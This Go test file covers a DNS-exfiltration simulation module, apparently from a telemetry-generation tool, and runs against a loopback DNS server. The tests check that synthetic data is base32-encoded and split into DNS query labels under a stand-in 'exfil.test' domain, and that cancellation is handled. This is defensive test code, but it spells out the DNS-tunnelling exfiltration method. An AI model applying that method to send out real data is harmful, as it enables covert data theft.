package network

import (
	"context"
	"encoding/base32"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/0xv1n/macnoise/pkg/module"
)

// useDNSExfilServer routes the real Go resolver to a loopback UDP server.
// Tests replacing DefaultResolver must stay sequential. reply returns a DNS
// response code, or -1 to leave a query unanswered for cancellation tests.
func useDNSExfilServer(t *testing.T, reply func(string) int) {
	t.Helper()
	conn, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	done := make(chan struct{})
	go func() {
		defer close(done)
		buf := make([]byte, 1500)
		for {
			n, addr, err := conn.ReadFrom(buf)
			if err != nil {
				return
			}
			// Decode the uncompressed question sent by net.Resolver and omit
			// its optional EDNS section from our response.
			var labels []string
			pos := 12
			for pos < n && buf[pos] != 0 {
				size := int(buf[pos])
				pos++
				if size > 63 || pos+size >= n {
					t.Error("invalid DNS question")
					return
				}
				labels = append(labels, string(buf[pos:pos+size]))
				pos += size
			}
			if pos+5 > n {
				t.Error("truncated DNS question")
				return
			}
			rcode := reply(strings.Join(labels, "."))
			if rcode < 0 {
				continue
			}
			response := append([]byte(nil), buf[:pos+5]...)
			binary.BigEndian.PutUint16(response[2:4], 0x8180|uint16(rcode))
			clear(response[6:12])
			if rcode == 0 && binary.BigEndian.Uint16(buf[pos+1:pos+3]) == 1 {
				response[7] = 1 // One A answer, pointing to the question name.
				response = append(response, 0xc0, 0x0c, 0, 1, 0, 1, 0, 0, 0, 0, 0, 4, 127, 0, 0, 1)
			}
			if _, err := conn.WriteTo(response, addr); err != nil {
				t.Errorf("DNS response: %v", err)
				return
			}
		}
	}()
	previous := net.DefaultResolver
	net.DefaultResolver = &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, "udp", conn.LocalAddr().String())
		},
	}
	t.Cleanup(func() {
		net.DefaultResolver = previous
		_ = conn.Close()
		<-done
	})
}

func TestDNSExfilGenerate_QueriesAndOutcomes(t *testing.T) {
	for _, runID := range []string{"", "dnsexfilrun42"} {
		t.Run("runID="+runID, func(t *testing.T) {
			var mu sync.Mutex
			var queries []string
			useDNSExfilServer(t, func(name string) int {
				mu.Lock()
				queries = append(queries, name)
				mu.Unlock()
				if strings.Contains(name, ".1.") {
					return 3 // NXDOMAIN for the middle chunk; later chunks must run.
				}
				return 0
			})
			payload := strings.Repeat("synthetic-data-", 6)
			encoded := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(payload)))
			var want []string
			for i := 0; len(encoded) > 0; i++ {
				end := min(63, len(encoded))
				suffix := "exfil.test"
				if runID != "" {
					suffix = runID + "." + suffix
				}
				want = append(want, fmt.Sprintf("%s.%d.%s", encoded[:end], i, suffix))
				encoded = encoded[end:]
			}
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			ctx = module.ContextWithRunID(ctx, runID)
			var events []module.TelemetryEvent
			mod := &netDNSExfil{}
			err := mod.Generate(ctx, module.Params{"payload": payload, "base_domain": "exfil.test."}, func(ev module.TelemetryEvent) {
				events = append(events, ev)
			})
			if err != nil {
				t.Fatal(err)
			}
			if len(events) != len(want) {
				t.Fatalf("got %d events, want %d", len(events), len(want))
			}
			mu.Lock()
			observed := append([]string(nil), queries...)
			mu.Unlock()
			// A and AAAA requests (and retries) may repeat a name, but each
			// chunk must reach the server in sequence before the next chunk.
			var unique []string
			for _, name := range observed {
				if len(unique) == 0 || unique[len(unique)-1] != name {
					unique = append(unique, name)
				}
			}
			if strings.Join(unique, "\n") != strings.Join(want, "\n") {
				t.Errorf("server queries = %v, want %v", unique, want)
			}
			for i, ev := range events {
				outcome := module.OutcomeExecuted
				if i == 1 {
					outcome = module.OutcomeDenied
				}
				if ev.Module != "net_dns_exfil" || ev.EventType != "dns_exfil_query" || !ev.Success || ev.ResolvedOutcome() != outcome || (ev.Error != "") != (i == 1) {
					t.Errorf("event %d = %+v", i, ev)
				}
				if ev.Details["query"] != want[i]+"." || ev.Details["chunk_index"] != i || ev.Details["total"] != len(want) || ev.Details["base_domain"] != "exfil.test." {
					t.Errorf("event %d details = %+v", i, ev.Details)
				}
			}
			if err := mod.Cleanup(); err != nil {
				t.Fatal(err)
			}
		})
	}
}

func TestDNSExfilGenerate_CancelInFlight(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	started := make(chan struct{}, 1)
	useDNSExfilServer(t, func(string) int {
		select {
		case started <- struct{}{}:
		default:
		}
		cancel()
		return -1
	})
	var events []module.TelemetryEvent
	err := (&netDNSExfil{}).Generate(ctx, module.Params{"payload": "test", "base_domain": "exfil.test."}, func(ev module.TelemetryEvent) {
		events = append(events, ev)
	})
	select {
	case <-started:
	default:
		t.Fatal("query never reached the server")
	}
	if !errors.Is(err, context.Canceled) {
		t.Errorf("Generate = %v, want context.Canceled", err)
	}
	if len(events) != 0 {
		t.Errorf("canceled lookup emitted completed/denied events: %+v", events)
	}
}

func TestDNSExfilGenerate_CancelBetweenChunks(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	useDNSExfilServer(t, func(name string) int {
		if !strings.Contains(name, ".0.") {
			t.Errorf("queried another chunk after cancellation: %s", name)
		}
		return 0
	})
	var events []module.TelemetryEvent
	err := (&netDNSExfil{}).Generate(ctx, module.Params{"payload": strings.Repeat("test", 40), "base_domain": "exfil.test."}, func(ev module.TelemetryEvent) {
		events = append(events, ev)
		cancel()
	})
	if !errors.Is(err, context.Canceled) || len(events) != 1 {
		t.Fatalf("err = %v, events = %d; want canceled after one event", err, len(events))
	}
}
